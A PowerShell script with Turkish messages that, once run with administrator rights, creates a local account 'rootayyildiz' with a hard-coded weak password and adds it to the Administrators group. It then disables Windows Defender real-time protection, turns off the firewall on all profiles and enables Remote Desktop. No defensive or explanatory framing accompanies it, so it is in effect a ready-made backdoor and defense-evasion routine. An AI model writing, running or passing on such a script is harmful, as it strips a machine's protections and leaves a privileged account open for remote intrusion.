function Check-Admin {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $isAdmin) {
        Write-Host "Bu scripti çalıştırmak için yönetici yetkilerine sahip olmalısınız!" -ForegroundColor Red
        exit
    }
}

function Get-LocalIPAddress {
    $ip = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress
    return $ip
}

function Check-UserExists {
    param([string]$Username)
    $user = Get-LocalUser -Name $Username -ErrorAction SilentlyContinue
    if ($user) {
        return $true
    }
    else {
        return $false
    }
}

function Add-NewUser {
    param([string]$Username, [string]$Password)
    if (Check-UserExists -Username $Username) {
        Write-Host "$Username adlı kullanıcı zaten mevcut!" -ForegroundColor Yellow
    } else {
        $SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
        New-LocalUser -Name $Username -Password $SecurePassword -FullName "$Username Fullname" -Description "Yeni Yönetici Kullanıcı"
        Write-Host "$Username adlı kullanıcı başarıyla eklendi." -ForegroundColor Green
    }
}

function Add-UserToAdminGroup {
    param([string]$Username)
    if (Check-UserExists -Username $Username) {
        Add-LocalGroupMember -Group "Administrators" -Member $Username
        Write-Host "$Username yönetici grubuna eklendi." -ForegroundColor Green
    } else {
        Write-Host "Kullanıcı bulunamadı: $Username" -ForegroundColor Red
    }
}

function Disable-WindowsDefender {
    Write-Host "Windows Defender devre dışı bırakılıyor..."
    Set-MpPreference -DisableRealtimeMonitoring $true
    Write-Host "Windows Defender başarıyla devre dışı bırakıldı." -ForegroundColor Green
}

function Disable-WindowsFirewall {
    Write-Host "Güvenlik duvarı devre dışı bırakılıyor..."
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    Write-Host "Güvenlik duvarı başarıyla devre dışı bırakıldı." -ForegroundColor Green
}

function Enable-RDP {
    Write-Host "Uzak Masaüstü etkinleştiriliyor..."
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Write-Host "Uzak Masaüstü başarıyla etkinleştirildi." -ForegroundColor Green
}

Check-Admin

$Username = "rootayyildiz"
$Password = "123456!'^+%&/"

Add-NewUser -Username $Username -Password $Password
Add-UserToAdminGroup -Username $Username
Disable-WindowsDefender
Disable-WindowsFirewall
Enable-RDP

$ServerIP = Get-LocalIPAddress
Write-Host "Sunucu IP Adresi: $ServerIP"
Start-Process "mstsc" -ArgumentList "/v:$ServerIP /admin"
